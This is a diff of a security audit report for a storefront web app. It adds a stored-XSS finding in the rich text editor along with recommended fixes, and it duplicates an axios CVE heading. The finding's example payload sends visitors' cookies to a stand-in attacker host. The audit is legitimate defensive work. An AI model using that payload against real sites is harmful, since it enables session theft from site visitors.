@@ -60,9 +60,44 @@ The credentials were compiled into `dist/assets/index-*.js` and visible in plain
 
 ---
 
+## Phase 2: Code Review — Client-Side Security
+
+### High Severity (1+)
+
+#### 1. Stored XSS via Rich Text Editor (About Us Content)
+- **Severity:** High (CVSS: 8.1)
+- **Status:** ⚠️ VULNERABLE
+- **Files Affected:** 
+  - `components/ui/RichTextEditor.tsx:95` (preview)
+  - `components/storefront/AboutPage.tsx:20` (storefront)
+  - `components/admin/settings/AboutSettings.tsx` (admin interface)
+- **Vulnerability:** 
+  - Admins can input raw HTML with no sanitization
+  - Arbitrary `<script>`, `<iframe>`, and dangerous tags allowed
+  - Content stored in database and rendered to all visitors
+  - Uses `dangerouslySetInnerHTML` without any validation
+- **Impact:**
+  - Session theft via XSS
+  - Phishing attacks
+  - Malware distribution
+  - Defacement
+- **Exploitation:** If admin account compromised (or social engineering), attacker can inject malicious JavaScript
+- **Exploit Example:** `<script>fetch('https://evil.com?c='+document.cookie)</script>`
+- **Affected Users:** All visitors to the About Us page
+- **Recommended Fix:** 
+  - ✅ Implement HTML sanitization using DOMPurify (fix DOMPurify vulnerabilities first!)
+  - ✅ Whitelist allowed HTML tags only (`<p>`, `<b>`, `<i>`, `<h2>`, `<h3>`, `<br>`, `<img>`)
+  - ✅ Blacklist dangerous tags (`<script>`, `<iframe>`, `<object>`, `<embed>`, `<form>`)
+  - ✅ Add Content Security Policy headers
+  - ✅ Validate HTML on server-side before saving to database
+
+---
+
 ## Phase 1: Dependency Vulnerability Scan
 
 ### Critical Severity (1 additional)
+
+#### 2. axios — Uncontrolled Resource Consumption (CVE-2024-39338)
 
 #### 1. axios — Uncontrolled Resource Consumption (CVE-2024-39338)
 - **Severity:** Critical (CVSS: 9.1)
